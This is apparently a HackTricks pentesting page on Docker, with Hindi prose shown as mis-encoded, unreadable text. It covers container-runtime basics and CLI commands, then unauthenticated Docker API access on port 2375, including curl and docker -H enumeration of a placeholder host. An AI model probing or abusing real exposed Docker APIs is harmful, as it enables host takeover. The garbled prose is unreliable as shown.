<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХреЛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ **рдЖрдкрдХреА рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) **рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## Docker Basics

### рдХреНрдпрд╛ рд╣реИ

Docker **containerization рдЙрджреНрдпреЛрдЧ** рдореЗрдВ **рдкреНрд░рдореБрдЦ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо** рд╣реИ, **рдирд┐рд░рдВрддрд░ рдирд╡рд╛рдЪрд╛рд░** рдХрд╛ рдореБрдЦреНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреА рдЖрд╕рд╛рди рд░реВрдк рд╕реЗ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╡рд┐рддрд░рдг рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ **рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реЗ рднрд╡рд┐рд╖реНрдпрд╡рд╛рдгреА** рддрдХ рдлреИрд▓рддреЗ рд╣реИрдВ, рдФрд░ рдЙрдирдХреА **рд╕реБрд░рдХреНрд╖рд┐рдд рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ** рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдкрд░рд┐рд╡реЗрд╢реЛрдВ рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред

### рдореВрд▓ docker рд╡рд╛рд╕реНрддреБрдХрд▓рд╛

- **[containerd](http://containerd.io)**: рдпрд╣ рдПрдХ **рдореБрдЦреНрдп рд░рдирдЯрд╛рдЗрдо** рд╣реИ рдЬреЛ containers рдХреА рдЬреАрд╡рдирдЪрдХреНрд░ рдХреА рд╡реНрдпрд╛рдкрдХ **рдкреНрд░рдмрдВрдзрди** рдХрд╛ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ **рдЫрд╡рд┐ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдФрд░ рднрдВрдбрд╛рд░рдг** рдХрд╛ рд╕рдВрдмрдВрдзрд┐рдд рдХрд╛рдо рд╢рд╛рдорд┐рд▓ рд╣реИ, рд╕рд╛рде рд╣реА containers рдХреА **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди, рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ** рдХрд╛ рдкрд░рд┐рдЪрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред containerd рдкрд░ **рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЕрдиреБрднрд╡** рд╣реИрдВред
- **container-shim** containers рдХреЗ **рд╣реЗрдбрд▓реЗрд╕ containers** рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИ, рдЬреЛ containers рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж **runc** рд╕реЗ рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ рд╕рдВрднрд╛рд▓ рд▓реЗрддрд╛ рд╣реИред
- **[runc](http://runc.io)**: рдЗрд╕рдХреА **рд╣рд▓реНрдХреЗ рдФрд░ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ container runtime** рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рдВрд╕рд┐рдд runc, **OCI рдорд╛рдирдХ** рдХреЗ рд╕рд╛рде рд╕рдВрд░реЗрдЦрд┐рдд рд╣реИред рдпрд╣ containerd рджреНрд╡рд╛рд░рд╛ containers рдХреА **рдЖрд░рдВрдн рдХрд░рдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП OCI рджрд┐рд╢рд╛рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдореВрд▓ **libcontainer** рд╕реЗ рд╡рд┐рдХрд╕рд┐рдд рд╣реИред
- **[grpc](http://www.grpc.io)** containerd рдФрд░ **docker-engine** рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ, **рдХреБрд╢рд▓ рдмрд╛рддрдЪреАрдд** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред
- **[OCI](https://www.opencontainers.org)** рд░рдирдЯрд╛рдЗрдо рдФрд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП **OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ** рдмрдирд╛рдП рд░рдЦрдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдирд╡реАрдирддрдо Docker рд╕рдВрд╕реНрдХрд░рдг **OCI рдЫрд╡рд┐ рдФрд░ рд░рдирдЯрд╛рдЗрдо** рдорд╛рдирдХреЛрдВ рдХреЗ рд╕рд╛рде **рд╕рдВрдЧрдд** рд╣реИрдВред

### рдореВрд▓ рдХрдорд╛рдВрдбреНрд╕
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

**Containerd** рдХреЛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **Docker рдФрд░ Kubernetes** рдЬреИрд╕реЗ рдХрдВрдЯреЗрдирд░ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИ, рдЬреИрд╕реЗ Linux, Windows, Solaris, рдФрд░ рдЕрдиреНрдп, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЕрдмрд╕реНрдЯреНрд░реИрдХреНрдЯ рдХрд░рдХреЗред Containerd рдХрд╛ рд▓рдХреНрд╖реНрдп рдЙрд╕рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЖрд╡рд╢реНрдпрдХ рдореМрд▓рд┐рдХ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╣реА рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реИ, рдЕрдирд╛рд╡рд╢реНрдпрдХ рдШрдЯрдХреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд▓рдХреНрд╖реНрдп рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╣рд╛рд╕рд┐рд▓ рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рдореБрдЦреНрдп рдбрд┐рдЬрд╝рд╛рдЗрди рдирд┐рд░реНрдгрдп рдпрд╣ рд╣реИ рдХрд┐ **Containerd рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХрд╛ рд╕рдВрднрд╛рд▓рди рдирд╣реАрдВ рдХрд░рддрд╛**ред рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЛ рд╡рд┐рддрд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рддрддреНрд╡ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ (SDN) рдФрд░ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдЬреИрд╕реА рдЬрдЯрд┐рд▓рддрд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдПрдХ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рд╕реЗ рджреВрд╕рд░реЗ рдкрд░ рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, Containerd рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕рд┐рджреНрдзрд╛рдВрддреЛрдВ рдХреЛ рдЙрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдпрд╣ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

рдЬрдмрдХрд┐ **Docker Containerd рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрдВрдЯреЗрдирд░реНрд╕ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдмрд╛рдд рдХрд╛ рдорд╣рддреНрд╡ рд╣реИ рдХрд┐ Containerd рдХреЗрд╡рд▓ Docker рдХреА рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, Containerd рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрди рдХреА рдХреНрд╖рдорддрд╛рдПрдВ рдирд╣реАрдВ рд╣реИрдВ рдЬреЛ Docker рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ рдФрд░ рдпрд╣ рд╕реАрдзреЗ Docker swarms рдХрд╛ рдирд┐рд░реНрдорд╛рдг рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рднрд╛рдЬрди Containerd рдХреА рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рднреВрдорд┐рдХрд╛ рдХреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреНрдпрд╛рджрд╛ рд╡рд┐рд╢реЗрд╖реАрдХреГрдд рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЙрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рдХреЛ рд╕реМрдВрдкрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд╕рд╛рде рдпрд╣ рдПрдХреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИред
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**Podman** рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдХрдВрдЯреЗрдирд░ рдЗрдВрдЬрди рд╣реИ рдЬреЛ [рдУрдкрди рдХрдВрдЯреЗрдирд░ рдЗрдирд┐рд╢рд┐рдПрдЯрд┐рд╡ (OCI) рдорд╛рдирдХреЛрдВ](https://github.com/opencontainers) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд░реЗрдб рд╣реИрдЯ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рдХрд╕рд┐рдд рдФрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ Docker рд╕реЗ рдХрдИ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЗрд╕рдХреА **рдбреЗрдордирд▓реЗрд╕ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░** рдФрд░ **рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реНрд╕** рдХрд╛ рд╕рдорд░реНрдерди, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд░реВрдЯ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХреЗ рдмрд┐рдирд╛ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

Podman рдХреЛ Docker рдХреЗ API рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ Docker CLI рдХрдорд╛рдВрдбреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕рдВрдЧрддрддрд╛ рдЗрд╕рдХреЗ рдПрдХреЛрд╕рд┐рд╕реНрдЯрдо рдХреЛ рднреА рдлреИрд▓рд╛рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **Buildah** рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдЗрдореЗрдЬреЗрд╕ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ рдФрд░ **Skopeo** рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдЬреЛ рдкреБрд╢, рдкреБрд▓ рдФрд░ рдЗрдВрд╕реНрдкреЗрдХреНрдЯ рдЬреИрд╕реЗ рдЫрд╡рд┐ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИрдВред рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдЙрдирдХреЗ [GitHub рдкреЗрдЬ](https://github.com/containers/buildah/tree/master/docs/containertools) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИрдВред

**рдореБрдЦреНрдп рдЕрдВрддрд░**

- **рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░**: Docker рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░ рдореЙрдбрд▓ рдХреЗ рд╡рд┐рдкрд░реАрдд, Podman рдмрд┐рдирд╛ рдбреЗрдорди рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдбрд┐рдЬрд╝рд╛рдЗрди рдпрд╣ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрдВрдЯреЗрдирд░ рдЙрди рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрдЬ рдХреЗ рд╕рд╛рде рдЪрд▓рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдЙрдиреНрд╣реЗрдВ рд╢реБрд░реВ рдХрд┐рдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЦрддреНрдо рдХрд░рдХреЗред

- **рд╕рд┐рд╕реНрдЯрдордб рдЗрдВрдЯреАрдЧреНрд░реЗрд╢рди**: Podman **systemd** рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реИ рддрд╛рдХрд┐ рдХрдВрдЯреЗрдирд░реЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ systemd рдпреВрдирд┐рдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдЯреЗрдирд░ рдкреНрд░рдмрдВрдзрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрд╣ Docker рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП systemd рдХрд╛ рдкреНрд░рдзрд╛рдирддрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рдкрд░реАрдд рд╣реИред

- **рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реНрд╕**: Podman рдХреА рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрдЬ рдХреЗ рддрд╣рдд рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреАред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрдВрдЯреЗрдирд░ рдЙрд▓реНрд▓рдВрдШрди рд╕реЗ рдЬреБрдбрд╝реА рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рдкреНрд░рднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрдЬ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рди рдХрд┐ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ред

Podman рдХрд╛ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рд▓рдЪреАрд▓рд╛ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдкреНрд░рдмрдВрдзрди рдФрд░ рдореМрдЬреВрджрд╛ Docker рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЗ рд╕рд╛рде рд╕рдВрдЧрддрд┐ рдХреЛ рдЬреЛрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ podman рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдбреЙрдХрд░ рдХреЗ рд╕рдорд╛рди API рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рд╣реИ, рдЖрдк podman рдХреЗ рд╕рд╛рде рдбреЙрдХрд░ рдХреЗ рд╕рдорд╛рди рдХрдорд╛рдВрдб рдЬреИрд╕реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рджреВрд░рд╕реНрде API рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375 рдкреЛрд░реНрдЯ рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдЬрдм рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рджреВрд░рд╕реНрде API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдИ рднреА рдореЗрдЬрд╝рдмрд╛рди / (рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ / рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## рдЬрд╛рдВрдЪ

### рдореИрдиреНрдпреБрдЕрд▓

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбреЙрдХрд░ API рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк `docker` рдХрдорд╛рдВрдб рдпрд╛ `curl` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
